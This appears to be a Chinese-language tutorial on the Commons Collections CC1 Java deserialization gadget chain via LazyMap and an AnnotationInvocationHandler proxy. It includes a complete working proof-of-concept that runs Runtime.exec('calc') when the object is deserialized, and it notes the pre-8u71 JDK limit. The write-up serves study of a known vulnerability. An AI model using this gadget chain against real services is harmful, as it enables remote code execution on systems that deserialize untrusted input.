# 0x01 Preface

CC链的关键在于`transform()`的触发。
上一篇中`transform()`的触发点在`AnnotationInvocationHandler`的`readObject`调用了`setValue`，进而触发`TransformedMap`的`checkSetValue`，进而触发`transform()`

`LazyMap`是另一处触发点，`LazyMap`的`get`方法中会执行`factory.transform()`。顾名思义，**''懒加载''**只有当找不到值的时候才会去**get**

* LazyMap：get元素时触发
* TransformedMap：set元素时触发

```java
public class LazyMap implements Serializable {
    protected LazyMap(Map map, Transformer factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        }
        this.factory = factory;
    }
    public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
}
```

# 0x02 Step Forward

与`TransformedMap`不同，在`sun.reflect.annotation.AnnotationInvocationHandler`的`readObject`方法中并没有直接调用到Map的get方法。

ysoserial找到了`AnnotationInvocationHandler`的invoke方法中调用了get

```java
public Object invoke(Object proxy, Method method, Object[] args) {
    String member = method.getName();
    Class<?>[] paramTypes = method.getParameterTypes();

    // Handle Object and Annotation methods
    if (member.equals("equals") && paramTypes.length == 1 &&
        paramTypes[0] == Object.class)
        return equalsImpl(args[0]);
    if (paramTypes.length != 0)
        throw new AssertionError("Too many parameters for an annotation method");

    switch(member) {
        case "toString":
            return toStringImpl();
        case "hashCode":
            return hashCodeImpl();
        case "annotationType":
            return type;
    }

    // Handle annotation member accessors
    Object result = memberValues.get(member);
    // ....
}
```

`sun.reflect.annotation.AnnotationInvocationHandler`实际是个代理类，其实现了`InvocationHandler`接口。

📌目标：

1. `readObject`中调用任意方法，调用者是`AnnotationInvocationHandler`代理对象
2. `AnnotationInvocationHandler`的`invoke`触发`memberValues.get()`
   因此代理对象的`memberValues`要设为`LazyMap`
3. `LazyMap#get`触发`factory.transform()`

# 0x03 Weave POC

```java
public static void main(String[] args) throws Exception {
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(
            "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer(
            "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
        new InvokerTransformer(
            "exec", new Class[]{String.class}, new Object[]{"calc"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    Map argMap = new HashMap();
    Map evilMap = LazyMap.decorate(argMap, chainedTransformer);

    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
    constructor.setAccessible(true);
    InvocationHandler handler = (InvocationHandler)constructor.newInstance(Retention.class, evilMap);
    // 代理对象proxyMap
    Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

    handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);


    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);
    oos.writeObject(handler);
    oos.close();

    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
    Object o = (Object) ois.readObject();
}
```

POC中触发invoke的是`AnnotationInvocationHandler#readObject` =>`memberValues.entrySet()`

因此`Proxy.newProxyInstance`传的是`Map`的`ClassLoader`和接口

# 0x04 ShortCut

`LazyMap`的漏洞触发在get和invoke中
而`TransformedMap`的漏洞触发在setValue中
同样在 **jdk 8u71**之后，由于`AnnotationInvocationHandler`不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，后续对Map的操作都是基于这个新的LinkedHashMap对象。
因此CC1链只局限在**jdk 8u71**之前的版本。